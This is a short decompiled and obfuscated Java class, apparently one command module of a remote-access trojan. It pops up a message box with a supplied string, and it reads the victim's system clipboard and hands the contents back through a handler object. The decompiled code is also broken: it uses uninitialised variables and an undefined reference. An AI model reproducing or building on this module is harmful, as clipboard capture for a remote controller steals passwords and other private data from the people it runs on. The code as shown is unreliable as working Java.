/*
 * Decompiled with CFR 0.150.
 */
package FuckingHackerToby;

import FuckingHackerToby.N;
import FuckingHackerToby.ta;
import java.awt.Dialog;
import java.awt.HeadlessException;
import java.awt.Toolkit;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.IOException;
import javax.swing.JOptionPane;

public final class ca
extends N {
    private /* synthetic */ String ALLATORIxDEMO;

    @Override
    public /* synthetic */ void D(ta a2) {
        ca a3;
        Object object = a2 = new JOptionPane(a3.ALLATORIxDEMO).createDialog(null);
        ((Dialog)object).setModal(false);
        ((Dialog)object).setVisible(true);
    }

    @Override
    public /* synthetic */ void c(ta a2) {
    }

    public /* synthetic */ ca() {
        ca a2;
        ca ca2 = a2;
        ca2.a = 0;
        ca2.ALLATORIxDEMO = "";
    }

    @Override
    public /* synthetic */ void I(ta a2) {
        a.ALLATORIxDEMO = a2.H();
    }

    @Override
    public /* synthetic */ void b(ta a2) {
        ca a3;
        a2.ALLATORIxDEMO(a3.ALLATORIxDEMO);
    }

    public /* synthetic */ String ALLATORIxDEMO() {
        ca a2;
        return a2.ALLATORIxDEMO;
    }

    @Override
    public /* synthetic */ void d(ta a2) {
    }

    @Override
    public /* synthetic */ void E(ta a2) {
        ca a3;
        a3.a = 1;
        try {
            Clipboard clipboard = Toolkit.getDefaultToolkit().getSystemClipboard();
            Object object = clipboard.getData(DataFlavor.stringFlavor);
            if (object != null) {
                a3.ALLATORIxDEMO = (String)object;
            }
        }
        catch (HeadlessException | UnsupportedFlavorException | IOException exception) {
            a3.ALLATORIxDEMO = "";
        }
        a2.H(a3);
    }
}

